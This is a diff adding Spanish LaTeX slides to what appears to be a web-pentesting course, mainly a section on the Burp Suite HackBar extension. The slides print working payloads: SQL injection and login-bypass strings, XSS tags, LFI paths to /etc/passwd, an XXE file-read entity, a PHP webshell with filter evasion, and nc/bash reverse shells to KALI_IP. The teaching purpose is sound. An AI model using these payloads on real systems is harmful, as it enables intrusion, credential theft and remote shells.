@@ -39,6 +39,10 @@
 
 \begin{frame}[plain]\titlepage\end{frame}
 
+\begin{frame}{Índice}\scriptsize\tableofcontents\end{frame}
+
+\begin{frame}[plain]\begin{center}\includegraphics[width=\textwidth,height=0.92\textheight,keepaspectratio]{img/taxonomia-ataque.pdf}\end{center}\end{frame}
+
 \section{File Upload}
 
 \begin{frame}[allowframebreaks]{Ataques File Upload}
@@ -4473,6 +4477,250 @@
   \item Contenido en disco $\neq$ del sistema $\cdot$ TLS 1.2+/HSTS $\cdot$ logging por sitio.
   \item Mínimo privilegio + parcheo: el pool nunca debe ser admin local.
   \end{itemize}
+\end{frame}
+
+% --- HackBar (movido desde 4.1: herramienta transversal) ---
+\section{HackBar}
+
+\begin{frame}[allowframebreaks]{HackBar --- Extensión de Burp Suite}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item ¿Qué es HackBar?
+  \item Extensión de Burp Suite que acelera la inserción de payloads
+  \item para las vulnerabilidades web más comunes. Evita errores de
+  \item escritura manual y permite explotar desde el Repeater con
+  \item un clic derecho $\rightarrow$ Hackbar $\rightarrow$ seleccionar payload.
+  \item Instalación
+  \item 1. Burp Suite $\rightarrow$ Extensions $\rightarrow$ BApp Store
+  \item 2. Buscar 'HackBar' $\rightarrow$ Install
+  \item --- O bien: descargar el .jar y añadirlo manualmente
+  \item 3. Extensions $\rightarrow$ Add $\rightarrow$ Type: Java $\rightarrow$ seleccionar el .jar
+  \item 4. Verificar en Repeater: clic derecho $\rightarrow$ debe aparecer 'Hackbar'
+  \item Vulnerabilidades cubiertas
+  \item SQL Injection (ORDER BY, UNION, Login Bypass)
+  \item Cross-Site Scripting (XSS)
+  \item Local File Inclusion (LFI) --- Linux y Windows
+  \item XXE Injection
+  \item File Upload (webshell PHP)
+  \item OS Command Injection + Reverse Shells
+  \item BApp Store: portswigger.net/bappstore
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl052_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{HackBar --- SQL Injection: ORDER BY y UNION}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item Flujo de trabajo con HackBar
+  \item 1. Interceptar petición $\rightarrow$ Send to Repeater (Ctrl+R)
+  \item 2. Clic derecho en el parámetro inyectable
+  \item 3. Hackbar $\rightarrow$ SQL Injection $\rightarrow$ elegir técnica
+  \item Determinar número de columnas
+  \item Hackbar $\rightarrow$ SQL Injection $\rightarrow$ Column Count $\rightarrow$ Order By
+  \item $\rightarrow$ Prueba ORDER BY 1, 2, 3... hasta que se produzca error
+  \item $\rightarrow$ Error en ORDER BY 4 $\rightarrow$ la tabla tiene 3 columnas
+  \item UNION-Based: extraer datos
+  \item Reemplazar id=1 por id=-1 (evitar datos reales)
+  \item Hackbar $\rightarrow$ SQL Injection $\rightarrow$ Union Based $\rightarrow$ No. of Columns: 3
+  \item $\rightarrow$ Genera: -1 UNION SELECT 1,2,3 --
+  \item $\rightarrow$ Los números visibles en respuesta = campos inyectables
+  \item Extraer información de la BD
+  \item Sustituir número visible por función:
+  \item -1 UNION SELECT 1,database(),version() --
+  \item -1 UNION SELECT 1,user(),@@datadir --
+  \item -1 UNION SELECT 1,schema\_name,3 FROM information\_schema.schemata --
+  \item Fuente: BurpSuite.pdf --- Sección SQL Injection
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl053_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{HackBar --- SQLi Login Bypass}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item Login Bypass con HackBar
+  \item HackBar incluye diccionarios predefinidos de payloads
+  \item de bypass de autenticación SQL listos para inyectar.
+  \item Procedimiento
+  \item 1. Interceptar el formulario de login (POST /login)
+  \item 2. Send to Repeater $\rightarrow$ localizar parámetros uname y pass
+  \item 3. Seleccionar los parámetros $\rightarrow$ clic derecho:
+  \item Hackbar $\rightarrow$ SQLi Login Bypass $\rightarrow$ Set 1 $\rightarrow$ 'or''='
+  \item 4. Enviar con Send $\rightarrow$ analizar la respuesta
+  \item $\rightarrow$ Si la respuesta muestra dashboard/panel: bypass exitoso
+  \item Payloads equivalentes manuales
+  \item admin'--
+  \item ' OR '1'='1
+  \item ' OR 1=1--
+  \item ' OR ''='
+  \item admin'/*
+  \item Sets adicionales en HackBar
+  \item Si el Set 1 no funciona, probar Set 2, Set 3...
+  \item Cada set contiene payloads con diferente sintaxis para
+  \item evadir distintos tipos de validación o filtros.
+  \item Si ningún set funciona: el campo puede usar prepared statements
+  \item Fuente: BurpSuite.pdf --- Sección SQLi Login Bypass
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl054_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{HackBar --- Cross-Site Scripting (XSS)}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item XSS con HackBar
+  \item HackBar incluye payloads XSS básicos y avanzados,
+  \item evitando errores de escritura de caracteres especiales.
+  \item Procedimiento
+  \item 1. Interceptar petición con el parámetro de búsqueda/input
+  \item 2. Send to Repeater
+  \item 3. Seleccionar el punto de inyección $\rightarrow$ clic derecho:
+  \item Hackbar $\rightarrow$ XSS $\rightarrow$ Basic $\rightarrow$ \textless{}script\textgreater{}alert('XSS')\textless{}/script\textgreater{}
+  \item 4. Send $\rightarrow$ revisar la respuesta HTML
+  \item $\rightarrow$ Si \textless{}script\textgreater{}alert('XSS')\textless{}/script\textgreater{} aparece sin escapar: vulnerable
+  \item 5. Usar 'Show Response in Browser' para confirmar el popup
+  \item Payloads adicionales en HackBar
+  \item XSS $\rightarrow$ Basic $\rightarrow$ diferentes variantes de \textless{}script\textgreater{}
+  \item XSS $\rightarrow$ Attribute $\rightarrow$ para inyectar en atributos HTML
+  \item XSS $\rightarrow$ Event handlers $\rightarrow$ onmouseover, onerror, onload...
+  \item XSS $\rightarrow$ Bypass $\rightarrow$ técnicas de evasión de filtros
+  \item Confirmar en el navegador
+  \item Burp Proxy $\rightarrow$ clic derecho $\rightarrow$ Show Response in Browser
+  \item $\rightarrow$ Pegar la URL generada en el navegador
+  \item $\rightarrow$ Si aparece el popup: XSS stored/reflected confirmado
+  \item Fuente: BurpSuite.pdf --- Sección Cross-Site Scripting
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl055_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{HackBar --- Local File Inclusion (LFI)}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item LFI con HackBar
+  \item HackBar incluye payloads para Linux, Windows y Path Traversal.
+  \item Procedimiento
+  \item 1. Identificar parámetro de inclusión de fichero:
+  \item ?page=home, ?file=index.php, ?include=about
+  \item 2. Interceptar la petición $\rightarrow$ Send to Repeater
+  \item 3. Seleccionar el valor del parámetro $\rightarrow$ clic derecho:
+  \item Hackbar $\rightarrow$ LFI $\rightarrow$ Simple Check $\rightarrow$ /etc/passwd
+  \item 4. Send $\rightarrow$ verificar si aparece el contenido del fichero
+  \item Payloads disponibles en HackBar
+  \item Linux:
+  \item /etc/passwd
+  \item /etc/shadow (requiere root)
+  \item /etc/hosts
+  \item /proc/self/environ
+  \item Windows:
+  \item C:/Windows/System32/drivers/etc/hosts
+  \item C:/boot.ini
+  \item Path Traversal:
+  \item ../../../../etc/passwd
+  \item ..\%2F..\%2F..\%2Fetc\%2Fpasswd (URL encoded)
+  \item php://filter/convert.base64-encode/resource=/etc/passwd
+  \item Fuente: BurpSuite.pdf --- Sección Local File Inclusion
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl056_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{HackBar --- XXE Injection}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item XXE con HackBar
+  \item HackBar genera automáticamente los payloads XML con
+  \item la definición de entidad externa y la referencia.
+  \item Procedimiento
+  \item 1. Identificar endpoint que procesa XML
+  \item (Content-Type: text/xml o application/xml)
+  \item 2. Interceptar la petición $\rightarrow$ Send to Repeater
+  \item 3. Clic derecho en el cuerpo XML $\rightarrow$ Hackbar $\rightarrow$ XXE $\rightarrow$ Select
+  \item $\rightarrow$ HackBar inserta automáticamente:
+  \item \textless{}!DOCTYPE foo [\textless{}!ENTITY file SYSTEM \textquotedbl{}file:///etc/passwd\textquotedbl{}\textgreater{}]\textgreater{}
+  \item 4. Sustituir el valor original por \&file; en el XML
+  \item 5. Send $\rightarrow$ el contenido del fichero aparece en la respuesta
+  \item Variantes de payload XXE
+  \item Lectura de fichero local: file:///etc/passwd
+  \item SSRF via XXE: http://169.254.169.254/latest/meta-data/
+  \item Error-based XXE: forzar error con entidad recursiva
+  \item Blind XXE: exfiltración por DNS/HTTP (OOB)
+  \item Tip: cambiar Content-Type
+  \item Si el endpoint no acepta XML, probar cambiar el Content-Type
+  \item de application/json a application/xml e inyectar el XXE.
+  \item Fuente: BurpSuite.pdf --- Sección XXE Injection
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl057_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{HackBar --- File Upload y Webshell PHP}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item Generar una Webshell con HackBar
+  \item HackBar puede generar webshells PHP para incluir en ficheros subidos.
+  \item Procedimiento
+  \item 1. En Burp Repeater $\rightarrow$ clic derecho en zona vacía:
+  \item Hackbar $\rightarrow$ File Upload $\rightarrow$ PHP Webshell $\rightarrow$ copiar el código generado
+  \item 2. Pegar en un fichero .php $\rightarrow$ guardar como webshell.php
+  \item 3. Subir el fichero via el formulario de upload vulnerable
+  \item 4. Descubrir la ruta de subida (gobuster, ffuf, código fuente)
+  \item 5. Acceder: http://victima.com/uploads/webshell.php?cmd=id
+  \item Webshell básica (generada por HackBar)
+  \item \textless{}?php echo system(\$\_GET[\textquotedbl{}cmd\textquotedbl{}]); ?\textgreater{}
+  \item ?cmd=id $\rightarrow$ usuario del servidor web
+  \item ?cmd=cat /etc/passwd $\rightarrow$ usuarios del sistema
+  \item ?cmd=ls /var/www/ $\rightarrow$ listar directorio web
+  \item Evasión de filtros de extensión
+  \item Cambiar .php $\rightarrow$ .php5, .phtml, .phar, .php7
+  \item Content-Type: cambiar a image/jpeg manteniendo el código PHP
+  \item Doble extensión: webshell.jpg.php (si solo valida inicio)
+  \item Null byte: webshell.php\%00.jpg (en PHP antiguo)
+  \item Para reverse shell: usar el módulo OS Command Injection de HackBar
+  \item Fuente: BurpSuite.pdf --- Sección Unrestricted File Upload
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl058_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{HackBar --- OS Command Injection y Reverse Shell}
+\small
+  \begin{itemize}
+  \item Herramientas / Burp Suite
+  \item Command Injection con HackBar
+  \item HackBar incluye payloads de inyección de comandos OS y generadores
+  \item de reverse shell de un solo comando (one-liners).
+  \item Procedimiento --- Reverse Shell
+  \item 1. Identificar parámetro vulnerable a command injection:
+  \item ?host=google.com $\rightarrow$ el servidor hace ping a ese host
+  \item 2. Interceptar $\rightarrow$ Send to Repeater
+  \item 3. Seleccionar el valor $\rightarrow$ clic derecho:
+  \item Hackbar $\rightarrow$ Reverse shell $\rightarrow$ One Liner $\rightarrow$ nc
+  \item 4. Añadir metacarácter separador antes del payload:
+  \item ; o | o \&\& o \%0a (newline URL-encoded)
+  \item 5. Introducir RHOST (IP de Kali) $\rightarrow$ OK
+  \item 6. Poner Kali en escucha: nc -lvnp 4444
+  \item 7. Send $\rightarrow$ la conexión reversa llega a Kali
+  \item One-liners disponibles en HackBar
+  \item nc (netcat): ;nc -e /bin/bash KALI\_IP 4444
+  \item bash: ;bash -i \textgreater{}\& /dev/tcp/KALI\_IP/4444 0\textgreater{}\&1
+  \item python: ;python3 -c 'import socket...'
+  \item perl: ;perl -e 'use Socket...'
+  \item Verificar la shell obtenida
+  \item id, whoami, hostname
+  \item python3 -c 'import pty;pty.spawn(\textquotedbl{}/bin/bash\textquotedbl{})' $\rightarrow$ TTY completa
+  \item Fuente: BurpSuite.pdf --- Sección OS Command Injection
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl059_1.png}
+\end{center}
 \end{frame}
 
 \begin{frame}[plain]
